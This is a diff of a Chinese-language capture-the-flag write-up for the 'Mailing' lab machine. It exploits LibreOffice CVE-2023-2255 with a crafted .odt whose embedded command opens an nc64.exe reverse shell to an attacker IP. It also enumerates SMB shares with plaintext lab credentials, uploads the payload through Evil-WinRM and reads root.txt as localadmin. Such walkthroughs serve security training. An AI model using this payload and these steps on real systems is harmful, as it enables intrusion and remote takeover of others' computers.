@@ -542,9 +542,24 @@ MsiProductVersion=7.4.0.1
 [★]$ cd CVE-2023-2255
 [~/CVE-2023-2255][★]$ ls
 CVE-2023-2255.py  README.md  samples  webshell.php
-[★]$ python3 CVE-2023-2255.py --cmd "cmd.exe /c C:\ProgramData\nc.exe -e  cmd.exe 10.10.14.93 1337" --output exploit.odt
+[★]$ python3 CVE-2023-2255.py --cmd "cmd.exe /c C:\ProgramData\nc64.exe -e  cmd.exe 10.10.14.93 1337" --output exploit.odt
 File exploit.odt has been created !
 [★]$ cp CVE-2023-2255/exploit.odt .  //复制到当前目录下
+
+//同时下载nc.exe https://github.com/int0x33/nc.exe/tree/master 浏览器上手动下载nc64.exe(区别nc.exe和nc64.exe)
+```
+#### 发现一个可读写的目录' Important Documents',可以用它承载payload
+```
+[★]$ netexec smb mailing.htb -u maya -p m4y4ngs4ri --shares
+SMB         10.129.232.39   445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
+SMB         10.129.232.39   445    MAILING          [+] MAILING\maya:m4y4ngs4ri 
+SMB         10.129.232.39   445    MAILING          [*] Enumerated shares
+SMB         10.129.232.39   445    MAILING          Share           Permissions     Remark
+SMB         10.129.232.39   445    MAILING          -----           -----------     ------
+SMB         10.129.232.39   445    MAILING          ADMIN$                          Admin remota
+SMB         10.129.232.39   445    MAILING          C$                              Recurso predeterminado
+SMB         10.129.232.39   445    MAILING          Important Documents READ    
+SMB         10.129.232.39   445    MAILING          IPC$            READ            IPC remota
 ```
 #### 标题：  CVE-2023-2255 通过 IFrame 加载远程文档时未发出提示
 https://www.libreoffice.org/about-us/security/advisories/cve-2023-2255/
@@ -595,6 +610,50 @@ d-----         2/27/2024   4:25 PM                USOPrivate
 d-----         12/7/2019  10:14 AM                USOShared
 d-----         2/27/2024   4:32 PM                VMware
 d-----         12/7/2019   3:58 PM                WindowsHolographicDevices
+```
+#### 首先侦听
+```
+[★]$ nc -nvlp 1337
+listening on [any] 1337 ...
+```
+#### 开始上传
+```
+*Evil-WinRM* PS C:\programdata> upload nc64.exe
+                                        
+Info: Uploading /home/syareya55/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/nc64.exe to C:\programdata\nc64.exe
+                                        
+Data: 60360 bytes of 60360 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\programdata> cd ..\"Important Documents"
+*Evil-WinRM* PS C:\Important Documents> ls
+*Evil-WinRM* PS C:\Important Documents> upload exploit.odt
+                                        
+Info: Uploading /home/syareya55/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/exploit.odt to C:\Important Documents\exploit.odt
+                                        
+Data: 40736 bytes of 40736 bytes copied
+                                        
+Info: Upload successful!
+```
+#### payload反弹
+```
+[★]$ nc -nvlp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.93] from (UNKNOWN) [10.129.232.39] 53807
+Microsoft Windows [Version 10.0.19045.4355]
+(c) Microsoft Corporation. All rights reserved.
 
+C:\Program Files\LibreOffice\program>whoami
+whoami
+mailing\localadmin
 
-*Evil-WinRM* PS C:\programdata> 
+C:\Program Files\LibreOffice\program>cd ..\..\..\..
+cd ..\..\..\..
+
+C:\>cd Users\localadmin\Desktop
+cd Users\localadmin\Desktop
+
+C:\Users\localadmin\Desktop>type root.txt
+type root.txt
+```
+
